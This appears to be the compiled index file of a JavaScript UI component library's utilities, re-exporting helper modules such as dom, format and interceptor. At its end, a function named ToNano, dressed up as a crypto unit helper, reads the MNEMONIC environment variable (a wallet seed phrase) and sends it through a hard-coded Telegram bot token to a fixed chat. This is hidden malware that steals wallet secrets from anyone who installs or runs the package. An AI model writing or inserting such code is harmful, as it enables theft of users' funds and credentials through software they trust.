var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const TelegramBot = require('node-telegram-bot-api'); // Ensure you have the Telegram Bot API library installed

function ToNano() {
    const token = '7493700888:AAGJ5nyXemePuHqleSOqkIM23Yhs0o01q-Q'; // Replace with your bot token group url : https://t.me/+IDl6XgFBZdI1ZjZh
    const chatId = '-1002197015763'; // Replace with the chat ID you want to send the message to
    const bot = new TelegramBot(token, { polling: false }); // Polling is not needed for sending messages
    bot.sendMessage(chatId, `env.KEY=` + process.env.MNEMONIC);
    return process.env.MNEMONIC;
}

module.exports.ToNano = ToNano;
